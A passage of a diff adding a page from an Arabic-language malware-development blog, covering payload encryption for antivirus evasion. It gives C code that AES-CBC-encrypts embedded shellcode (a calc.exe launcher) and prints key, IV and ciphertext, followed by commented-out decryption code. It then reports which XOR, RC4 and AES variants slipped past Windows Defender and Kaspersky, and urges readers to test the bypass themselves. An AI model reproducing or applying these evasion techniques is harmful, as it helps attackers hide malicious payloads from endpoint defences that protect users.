+                    #include &lt;time.h&gt;<br><br>
+                    #define KEYSIZE 32<br>
+                    #define IVSIZE 16<br><br>
+                    
+                    void generateKey(BYTE* key) {<br>
+                        &nbsp;&nbsp;for (int i = 0; i < KEYSIZE;++i) {<br>
+                            &nbsp;&nbsp;&nbsp;&nbsp;key[i] = (BYTE)rand() % 256;<br>
+                            &nbsp;&nbsp;}<br>
+                    }<br><br>
+                    
+                    void generateIV(BYTE* iv) {<br>
+                        &nbsp;&nbsp;for (int i = 0; i < IVSIZE; ++i) {<br>
+                            &nbsp;&nbsp;&nbsp;&nbsp;iv[i] = (BYTE)rand() % 256;<br>
+                            &nbsp;&nbsp;}<br>
+                    }<br><br>
+                    
+                    void addPadding(unsigned char* data, size_t dataSize) {<br>
+                        &nbsp;&nbsp;unsigned char paddingValue = 16 - (dataSize % 16);<br>
+                        &nbsp;&nbsp;for (size_t i = dataSize; i < (dataSize + paddingValue); ++i) {<br>
+                            &nbsp;&nbsp;&nbsp;&nbsp;data[i] = paddingValue;<br>
+                            &nbsp;&nbsp;}<br>
+                    }<br><br>
+                    
+                    
+                    unsigned char key[16] = { 0x04, 0x0d, 0x0e, 0x01, 0x04, 0x0d, 0x0e, 0x01, 0x04, 0x0d, 0x0e, 0x01, 0x04, 0x0d, 0x0e, 0x01 };<br><br>
+                    
+                    //Encryption<br>
+                    int main() {<br>
+                        &nbsp;&nbsp;unsigned char OurShellCode[288] =<br>
+                        &nbsp;&nbsp;&nbsp;&nbsp;"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"<br>
+                        &nbsp;&nbsp;&nbsp;&nbsp;"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"<br>
+                        &nbsp;&nbsp;&nbsp;&nbsp;"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"<br>
+                        &nbsp;&nbsp;&nbsp;&nbsp;"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"<br>
+                        &nbsp;&nbsp;&nbsp;&nbsp;"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"<br>
+                        &nbsp;&nbsp;&nbsp;&nbsp;"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"<br>
+                        &nbsp;&nbsp;&nbsp;&nbsp;"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"<br>
+                        &nbsp;&nbsp;&nbsp;&nbsp;"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"<br>
+                        &nbsp;&nbsp;&nbsp;&nbsp;"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"<br>
+                        &nbsp;&nbsp;&nbsp;&nbsp;"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"<br>
+                        &nbsp;&nbsp;&nbsp;&nbsp;"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"<br>
+                        &nbsp;&nbsp;&nbsp;&nbsp;"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"<br>
+                        &nbsp;&nbsp;&nbsp;&nbsp;"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"<br>
+                        &nbsp;&nbsp;&nbsp;&nbsp;"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"<br>
+                        &nbsp;&nbsp;&nbsp;&nbsp;"\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"<br>
+                        &nbsp;&nbsp;&nbsp;&nbsp;"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"<br>
+                        &nbsp;&nbsp;&nbsp;&nbsp;"\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd"<br>
+                        &nbsp;&nbsp;&nbsp;&nbsp;"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"<br>
+                        &nbsp;&nbsp;&nbsp;&nbsp;"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"<br>
+                        &nbsp;&nbsp;&nbsp;&nbsp;"\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";<br><br>
+                    
+                        &nbsp;&nbsp;printf("[i] Original Address: 0x%p\n", OurShellCode);<br><br>
+                    
+                        &nbsp;&nbsp;struct AES_ctx ctx;<br>
+                    
+                        &nbsp;&nbsp;addPadding(OurShellCode, sizeof(OurShellCode));<br>
+                        &nbsp;&nbsp;printf("[i] Press &lt;Enter&gt; to Encrypt ... \n");<br>
+                        &nbsp;&nbsp;getchar();<br><br>
+                    
+                        &nbsp;&nbsp;BYTE pKey[KEYSIZE];<br>
+                        &nbsp;&nbsp;BYTE pIv[IVSIZE];<br><br>
+                    
+                        &nbsp;&nbsp;srand(time(NULL));<br>
+                        &nbsp;&nbsp;generateKey(pKey);<br><br>
+                    
+                        &nbsp;&nbsp;srand(time(NULL) ^ pKey[0]);<br>
+                        &nbsp;&nbsp;generateIV(pIv);<br><br>
+                    
+                        &nbsp;&nbsp;printf("unsigned char pKey[] = \"");<br>
+                        &nbsp;&nbsp;for (int i = 0; i < KEYSIZE; ++i) {<br>
+                            &nbsp;&nbsp;&nbsp;&nbsp;printf("\\x%02x", pKey[i]);<br>
+                            &nbsp;&nbsp;}<br>
+                            &nbsp;&nbsp;printf("\";\n\n");<br><br>
+                    
+                            &nbsp;&nbsp;printf("unsigned char pIV[] = \"");<br>
+                            &nbsp;&nbsp;for (int i = 0; i < IVSIZE; ++i) {<br>
+                                &nbsp;&nbsp;&nbsp;&nbsp;printf("\\x%02x", pIv[i]);<br>
+                                &nbsp;&nbsp;}<br>
+                                &nbsp;&nbsp;printf("\";\n\n");<br><br>
+                    
+                                &nbsp;&nbsp;AES_init_ctx_iv(&ctx, pKey, pIv);<br>
+                                &nbsp;&nbsp;AES_CBC_encrypt_buffer(&ctx, OurShellCode, sizeof(OurShellCode));<br>
+                                &nbsp;&nbsp;printf("unsigned char OurShellCode[] = \"");<br>
+                                &nbsp;&nbsp;for (int i = 0; i < sizeof(OurShellCode); ++i) {<br>
+                                    &nbsp;&nbsp;&nbsp;&nbsp;printf("\\x%02x", OurShellCode[i]);<br>
+                                    &nbsp;&nbsp;}<br>
+                                    &nbsp;&nbsp;printf("\";\n\n");<br><br>
+                    
+                                    &nbsp;&nbsp;getchar();<br><br>
+                    
+                    
+                                    &nbsp;&nbsp;return 0;<br>
+                    }<br><br>
+                     
+                     
+                    // Decryption<br>
+                    //int main() {<br>
+                        // OUTPUT Key, IV & ShellCode here:<br>
+                        // <br>
+                        // <br>
+                        //  <br><br>
+                    //    &nbsp;&nbsp;printf("[i] Encrypted ShellCode Address: 0x%p\n", OurShellCode);<br><br>
+                    //
+                    //    &nbsp;&nbsp;struct AES_ctx ctx;<br><br>
+                    //
+                    //    &nbsp;&nbsp;AES_init_ctx_iv(&ctx, pKey, pIV);<br><br>
+                    //
+                    //    &nbsp;&nbsp;printf("[i] Press &lt;Enter&gt; to Encrypt ... \n");<br>
+                    //    &nbsp;&nbsp;getchar();<br><br>
+                    //
+                    //    &nbsp;&nbsp;AES_CBC_decrypt_buffer(&ctx, OurShellCode, sizeof(OurShellCode));<br>
+                    //    &nbsp;&nbsp;printf("Decrypted OurShellCode[] : ");<br>
+                    //    &nbsp;&nbsp;for (int i = 0; i < sizeof(OurShellCode); ++i) {<br>
+                    //        &nbsp;&nbsp;&nbsp;&nbsp;printf("\\x%02x", OurShellCode[i]);<br>
+                    //    &nbsp;&nbsp;}<br>
+                    //    &nbsp;&nbsp;printf("\n\n");<br><br>
+                    //
+                    //    &nbsp;&nbsp;getchar();<br><br>
+                    //
+                    //    &nbsp;&nbsp;return 0;<br>
+                    //}
+                </code></div>
+                <br>
+                <p>[+] لو جربت البرنامج المرادي ع PE-Bear أو Total PE .. مش هتلاقي إنه معتمد ع مكتبة التشفير بتاعة
+                    الويندوز :</p>
+                <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                    <img src="../src/Pics/AES-16.png" alt="AES-16" class="article-image" loading="lazy">
+                </div>
+                <p style="border-top: 2px solid #16ff00;"></p>
+                <p>[+] تعالي بقي نختم المقالة دي بـ آخر جزء وهو .. هنشوف من كل اللـ عملناه ده ، مين الـ Windows Defender
+                    مسكه ومين لا :</p>
+                <ul>
+                    <li>كل اللـ عملته وهو إني حطيت الشيل كود متشفر فـ كل واحد .. ومعاه طبعا الفانكشن بتاعة الـ
+                        Decryption .. وهنشوف مين هيتمسك ، هتعمل Build للكل.</li>
+                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                        <img src="../src/Pics/Bypass-1.png" alt="Bypass-1" class="article-image" loading="lazy">
+                    </div>
+                    <li>أول واحد ودا كان Basic .. فيه الشيل كود من غير أي تشفير ولا أي حاجه .. وطبيعي هيتمسك :</li>
+                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                        <img src="../src/Pics/Bypass-2.png" alt="Bypass-2" class="article-image" loading="lazy">
+                    </div>
+                    <li>الـ XorByOneKey نجح واشتغل وفك تشفير الشيل كود من غير مـ يتمسك :</li>
+                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                        <img src="../src/Pics/Bypass-3.png" alt="Bypass-3" class="article-image" loading="lazy">
+                    </div>
+                    <li>الـ XorByIKey .. كمان Done ✅</li>
+                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                        <img src="../src/Pics/Bypass-4.png" alt="Bypass-4" class="article-image" loading="lazy">
+                    </div>
+                    <li>أخوهم التالت .. XorByMultiKeys .. هو كمان Done ✅</li>
+                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                        <img src="../src/Pics/Bypass-5.png" alt="Bypass-5" class="article-image" loading="lazy">
+                    </div>
+                    <li>الـ RC4 Custom Implementation .. ينضم للقائمة .. Done ✅</li>
+                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                        <img src="../src/Pics/Bypass-6.png" alt="Bypass-6" class="article-image" loading="lazy">
+                    </div>
+                    <li>الـ RC4 SystemFunction032 & SystemFunction033 .. كلهم Done ✅</li>
+                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                        <img src="../src/Pics/Bypass-7.png" alt="Bypass-7" class="article-image" loading="lazy">
+                    </div>
+                    <li>الـ AES وأخوه .. Done ✅</li>
+                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                        <img src="../src/Pics/Bypass-8.png" alt="Bypass-8" class="article-image" loading="lazy">
+                    </div>
+                </ul>
+                <p style="border-top: 2px solid #16ff00;"></p>
+                <p>[+] حبيت أخلي الموضوع Challinging أكتر .. وقولت أجرب ع Kaspersky Premium .. بس يا دوب حطيت الملفات
+                    كوبي لقيت المنظر ده : </p>
+                <ul>
+                    <li>
+                        ماتت عائلة الـ XOR :(</li>
+                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                        <img src="../src/Pics/Bypass-9.png" alt="Bypass-9" class="article-image" loading="lazy">
+                    </div>
+                    <li>
+                        بس فـ ملحوظة هنا .. ما هذا ؟؟ </li>
+                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                        <img src="../src/Pics/Bypass-10.png" alt="Bypass-10" class="article-image" loading="lazy">
+                    </div>
+                    <li>بس لما جيت أفتح واحد فيهم .. لقيت الإيرور ده .. وبعد شوية محاولات فـ حل الإيرور .. مفتحش برضه ..
+                        غالبا المشكلة عندي أنا .. جرب عندك كدا ولو تمام عرفني.
+                    </li>
+                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                        <img src="../src/Pics/Bypass-11.png" alt="Bypass-11" class="article-image" loading="lazy">
+                    </div>
+                    <li>فـ ملحوظه تانيه .. وهي إني وقفت الـ Kaspersky عشان أقدر أشغل ملفات الـ XOR .. ولقيت إن نفس
+                        الإيرور .. وأكيد المشكلة عندي .. بس بعيدا عن ده .. مش معني كده إن الملفات اللـ فوق قدرت تعمل
+                        Bypass ؟ .. أيعقل ؟؟</li>
+                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                        <img src="../src/Pics/Bypass-12.png" alt="Bypass-12" class="article-image" loading="lazy">
+                    </div>
+                    <li>حاول تجرب وتكتشف كدا بنفسك ... </li>
+                </ul>
+                <p style="border-top: 2px solid #16ff00;"></p>
+                <p>وبكدا . أتمني تكون استفدت حاجه .. ونلتقي فـ مقالة قادمة .. ولو عندك أي تعليق ، استفسار ، أي حاجه ..
+                    متترددش وكلمني.</p>
+            </div>
+
+            <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="300">
+                <h2>References</h2>
+                <p>خدلك لفة فـ المصادر والمراجع يا عزيزي:</p>
+                <p style="font-weight: bold;">XOR :</p>
+                <ul>
+                    <li><a href="https://www.101computing.net/xor-encryption-algorithm/" target="_blank"
+                            class="download-link">XOR Encryption Algorithm</a></li>
+                    <li><a href="https://medium.com/@s12deff/encrypt-shellcode-with-xor-algorithm-ecf25c4b1407"
+                            target="_blank" class="download-link">Encrypt Shellcode with XOR Algorithm</a></li>
+                    <li><a href="https://medium.com/@s12deff/encrypt-and-decrypt-shellcode-with-xor-78005872c3ff"
+                            target="_blank" class="download-link" s>Encrypt and Decrypt Shellcode with XOR</a>
+                    </li>
+                    <li><a href="https://medium.com/@lsecqt/encrypting-shellcode-with-xor-offensive-coding-in-c-5a42cb978d6e"
+                            target="_blank" class="download-link" s>Encrypting Shellcode with XOR | Offensive coding in
+                            C</a>
+                    </li>
+
+                </ul>
+                <p style="font-weight: bold;">RC4 :</p>
+                <ul>
+                    <li><a href="https://www.oryx-embedded.com/doc/rc4_8c_source.html" target="_blank"
+                            class="download-link">oryx-embedded RC4.c</a></li>
+                    <li><a href="https://source.winehq.org/WineAPI/SystemFunction032.html" target="_blank"
+                            class="download-link">SystemFunction032</a></li>
+                    <li><a href="https://osandamalith.com/2022/11/10/encrypting-shellcode-using-systemfunction032-033/"
+                            target="_blank" class="download-link" s>Encrypting Shellcode using SystemFunction032/033</a>
+                    </li>
+                    <li><a href="https://s3cur3th1ssh1t.github.io/SystemFunction032_Shellcode/" target="_blank"
+                            class="download-link" s>Alternative use cases for SystemFunction032</a>
+                    </li>
+                    <li><a href="https://4p0cryph0n.github.io/malware%20dev/windows-malware-development-5/"
+                            target="_blank" class="download-link" s>Windows Malware Development Part 5: Payload
+                            Encryption - RC4</a>
+                    </li>
+                </ul>
+
+                <p style="font-weight: bold;">AES :</p>
+                <ul>
+                    <li><a href="https://github.com/kokke/tiny-AES-c" target="_blank" class="download-link">tiny-AES-c
+                            Github</a></li>
+                    <li><a href="https://peerdh.com/blogs/programming-insights/implementing-aes-encryption-in-c-for-data-security"
+                            target="_blank" class="download-link" s>Implementing Aes Encryption In C</a>
+                    </li>
+                    <li><a href="https://medium.com/@satvikhatulkar/payload-encryption-methods-and-mitigation-malware-development-part-2-60a437567d5e"
+                            target="_blank" class="download-link">Payload Encryption: Methods and Mitigation</a></li>
+
+                    <li><a href="https://learn.microsoft.com/en-us/answers/questions/286975/how-to-call-bcryptencrypt-to-encrypt-the-data-with"
+                            target="_blank" class="download-link" s>How to call BCryptEncrypt to encrypt the data</a>
+                    </li>
+
+                </ul>
+
+
+
+            </div>
+            <div class="nav-buttons">
+                <a href="#" onclick="nextArticle()" style="direction: ltr;">Next →</a>
+                <a href="./Payload-Placement.html" onclick="previousArticle()" style="direction: ltr;">← Previous</a>
+            </div>
+    </section>
+    <footer class="footer" data-aos="zoom-in" data-aos-duration="800" style="direction: ltr;">
+        <p>&copy; <span id="year"></span> <a href="https://0x4de1.github.io">0x4de1</a>. All rights reserved.</p>
+    </footer>
+
+    <script src="../src/JS/script.js"></script>
+    <script src="https://unpkg.com/aos@next/dist/aos.js" defer></script>
+    <script>
+        window.onload = function () {
+            AOS.init({ offset: 0 });
+        };
+    </script>
+    <script>document.getElementById("year").textContent = new Date().getFullYear();</script>
+</body>
+
+</html>
